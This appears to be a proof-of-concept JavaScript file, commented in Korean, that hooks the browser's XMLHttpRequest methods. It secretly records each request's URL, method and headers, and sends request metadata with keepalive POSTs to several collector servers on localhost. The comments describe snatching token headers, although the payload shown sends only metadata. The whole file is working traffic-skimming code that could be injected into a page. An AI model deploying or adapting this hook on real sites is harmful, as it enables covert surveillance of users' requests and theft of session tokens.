(function () {
  //서버 설정, 시드 설정
  const COLLECTORS = ["http://localhost:5001/mirror","http://localhost:5002/mirror","http://localhost:5003/mirror"];
  const sid = (()=>{ try { return localStorage.getItem('poc_sid') || 'no-sid'; } catch { return 'no-sid'; } })();
  let seq=0;

  //전송 되는 데이터 형태 판별, 간단한 파일 크기 계산
  function classifyBody(body){
    if(body==null) return {kind:"none", size:0};
    if(typeof body==="string"){
      const t=body.trim();
      const isJsonish=(t.startsWith("{")&&t.endsWith("}"))||(t.startsWith("[")&&t.endsWith("]"));
      const isUrlEnc=t.includes("=");
      return {kind:isJsonish?"json-string":(isUrlEnc?"urlencoded-string":"text"), size:body.length};
    }
    if(body instanceof FormData) return {kind:"formdata", size:-1};
    if(body instanceof Blob) return {kind:"blob", size:body.size};
    if(body instanceof ArrayBuffer) return {kind:"arraybuffer", size:body.byteLength};
    return {kind:"unknown", size:-1};
  }

  //content-type이 명시적이지 않을때, 데이터 내용을 보고 헤더타입을 유추하는 역할(중요하진 않음, 후킹한 데이터 분석은 구현할 필요 없음)
  function guessContentType(body, headerCt) {
    const ct = (headerCt || "").trim();
    if (ct) return ct;

    if (body == null) return "";

    if (body instanceof FormData) return "multipart/form-data";
    if (typeof body === "string") {
      const t = body.trim();
      const isJsonish =
        (t.startsWith("{") && t.endsWith("}")) ||
        (t.startsWith("[") && t.endsWith("]"));
      if (isJsonish) return "application/json";

      const isUrlEnc = t.includes("=");
      if (isUrlEnc) return "application/x-www-form-urlencoded";

      return "text/plain";
    }

    if (body instanceof Blob) return body.type || "application/octet-stream";
    if (body instanceof ArrayBuffer) return "application/octet-stream";

    return "";
  }

  //후킹한 데이터 여러 멀티오리진으로 동시전송
  function mirror(payload){
    for(const url of COLLECTORS){
        fetch(url,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify(payload),
            keepalive:true //페이지 닫거나 이동되는 경우에도 나름 안전하게
        }).catch(()=>{});
    }
  }

  //프로토타입 후킹 준비용 변수
  const origOpen=XMLHttpRequest.prototype.open;
  const origSend=XMLHttpRequest.prototype.send;
  const origSetHeader=XMLHttpRequest.prototype.setRequestHeader;
  //URL이랑 Method 몰래 기록하도록 덮어쓰기
  XMLHttpRequest.prototype.open=function(method,url){
    this.__poc=this.__poc||{};
    this.__poc.method=String(method||"GET").toUpperCase();
    this.__poc.url=String(url||"");
    this.__poc.headers=this.__poc.headers||{};
    return origOpen.apply(this,arguments);
  };
  //토큰 같은 헤더를 낚아채는 기능 덮어쓰기
  XMLHttpRequest.prototype.setRequestHeader=function(name,value){
    try{
      this.__poc=this.__poc||{};
      this.__poc.headers=this.__poc.headers||{};
      this.__poc.headers[String(name).toLowerCase()]=String(value);
    }catch{}
    return origSetHeader.apply(this,arguments);
  };
  //전송단계에서 미러서버로 보내고, 이후 원본 서버로 보내도록 덮어쓰기
  XMLHttpRequest.prototype.send=function(body){
    try{
      this.__poc=this.__poc||{};
      const c=classifyBody(body);
      const headerCt = (this.__poc.headers && this.__poc.headers["content-type"]) || "";
      
      const payload={
        type:"XHR_MIRROR",
        sid,
        seq:++seq,
        ts:Date.now(),
        method:this.__poc.method||"GET",
        url:this.__poc.url||"",
        contentType: guessContentType(body, headerCt),
        bodyKind:c.kind,
        bodySize:c.size,
        pageOrigin:location.origin
      };
      mirror(payload);
    }catch{}
    return origSend.apply(this,arguments);
  };

  //이건 그냥 후킹이 로드되면 페이지에 보이도록 확인용입니다.
  try{
    const el=document.createElement("div");
    el.textContent="XHR hook bundle loaded (:4000)";
    el.style.cssText="position:fixed;right:12px;bottom:12px;z-index:99999;background:#111827;color:#fff;padding:8px 10px;border-radius:10px;font:12px ui-monospace;box-shadow:0 8px 20px rgba(0,0,0,.18);";
    document.documentElement.appendChild(el);
    setTimeout(()=>el.remove(),2500);
  }catch{}
})();
